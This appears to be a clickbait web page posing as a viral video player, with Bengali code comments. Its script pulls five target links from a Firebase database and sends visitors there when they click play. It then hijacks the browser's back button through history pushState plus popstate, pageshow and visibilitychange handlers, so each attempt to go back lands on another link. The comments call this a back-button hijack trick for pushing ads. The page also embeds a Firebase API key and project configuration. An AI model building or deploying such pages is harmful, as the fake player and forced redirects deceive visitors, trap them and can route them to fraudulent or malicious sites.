<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Viral video Play now</title>

<!-- Firebase JS SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<style>
body{ margin:0; background:black; font-family:Arial; color:white; }
.topbar{ background:#f1f1f1; color:black; padding:10px; font-weight:bold; }

.video {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    background-image: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
    transition: background-image 0.5s ease-in-out; 
}

.play {
    width: 120px; height: 120px; border-radius: 50%; border: 3px solid white;
    display: flex; justify-content: center; align-items: center;
    font-size: 50px; box-shadow: 0 0 30px white; cursor: pointer;
    background: rgba(0, 0, 0, 0.4); 
    position: relative;
    z-index: 10;
}

.controls {
    position: fixed; bottom: 0; width: 100%; padding: 10px; background: rgba(0,0,0,0.8);
    z-index: 10;
}
.progress { height: 6px; background: #333; margin-bottom: 8px; }
.bar { width: 20%; height: 100%; background: white; }
.time { display: flex; justify-content: space-between; font-size: 14px; }
</style>
</head>

<body>

<div class="video" id="videoBg">
    <div class="play" onclick="openLink()">▶</div>
</div>

<div class="controls">
    <div class="progress"><div class="bar"></div></div>
    <div class="time"><span>0:11</span><span>8:32</span></div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyC2tguQFjkUvncBvn6-e7_Ux5vJ6lEzpjQ",
        authDomain: "vital-1f05b.firebaseapp.com",
        databaseURL: "https://vital-1f05b-default-rtdb.firebaseio.com",
        projectId: "vital-1f05b",
        storageBucket: "vital-1f05b.firebasestorage.app",
        messagingSenderId: "992463011532",
        appId: "1:992463011532:web:708ff147b8e7e1ce5b8c69"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const db = firebase.database();
    const maxRedirects = 5;
    let isRedirecting = false;

    // ফায়ারবেস থেকে ডাটা নিয়ে আসা
    function fetchSettings() {
        db.ref('playerSettings').on('value', (snapshot) => {
            const data = snapshot.val();
            if (data) {
                if (data.bgImage && data.bgImage.trim() !== "") {
                    document.getElementById('videoBg').style.backgroundImage = `url('${data.bgImage}')`;
                }
                const links = [data.link1, data.link2, data.link3, data.link4, data.link5];
                sessionStorage.setItem('targetLinks', JSON.stringify(links));
            }
        });
    }

    // ১ম বার প্লে বাটনে ক্লিক করলে
    function openLink() {
        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
        let linksData = sessionStorage.getItem('targetLinks');
        
        if (!linksData) {
            alert("ডেটা লোড হচ্ছে, দয়া করে ২ সেকেন্ড অপেক্ষা করুন...");
            return;
        }

        let targetLinks = JSON.parse(linksData);
        let currentLink = targetLinks[count] || "https://google.com";

        if (count < maxRedirects) {
            sessionStorage.setItem('redirectCount', 1);
            sessionStorage.setItem('hijackBack', 'true');
            
            // ব্রাউজার হিস্ট্রিতে একটি ফেইক স্টেট পুশ করা হলো
            history.pushState(null, null, location.href);
            window.location.href = currentLink; 
        } 
        else if (count >= maxRedirects) {
            alert("৫টি এড শেষ! এখন অরিজিনাল ভিডিও প্লে হচ্ছে...");
        }
    }

    // ওই ভাইরাল সাইটগুলোর মতো "History API Hijack" ট্রিক
    function executeBackHijack() {
        if (isRedirecting) return;
        
        let hijack = sessionStorage.getItem('hijackBack');
        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
        let linksData = sessionStorage.getItem('targetLinks');

        if (hijack === 'true' && count > 0 && count < maxRedirects && linksData) {
            isRedirecting = true;
            let targetLinks = JSON.parse(linksData);
            let nextLink = targetLinks[count] || "https://google.com";

            // পরবর্তী লিংকের জন্য কাউন্ট বাড়ানো হলো
            sessionStorage.setItem('redirectCount', count + 1);

            // ব্রাউজারকে ফাঁকি দিয়ে রিপ্লেস করা
            history.pushState(null, null, location.href); // ফেইক হিস্ট্রি ইনজেক্ট
            window.location.replace(nextLink); // সরাসরি নতুন পেজে নিক্ষেপ
        }
        else if (count >= maxRedirects) {
            sessionStorage.removeItem('hijackBack');
        }
    }

    // পেজ ব্যাক করে আসলে এই ইভেন্টগুলো হিট করবে
    window.addEventListener('pageshow', function(e) {
        if (e.persisted) { // Bfcache চেক
            executeBackHijack();
        } else {
            executeBackHijack();
        }
    });

    document.addEventListener("visibilitychange", function() {
        if (document.visibilityState === 'visible') { 
            executeBackHijack(); 
        }
    });

    // আসল ম্যাজিক: পপ-স্টেট (Back Button Press) ডিটেক্ট করা
    window.addEventListener('popstate', function(event) {
        executeBackHijack();
    });

    // পেজ লোড হলে ডাটা আনবে
    fetchSettings();
</script>

</body>
</html>
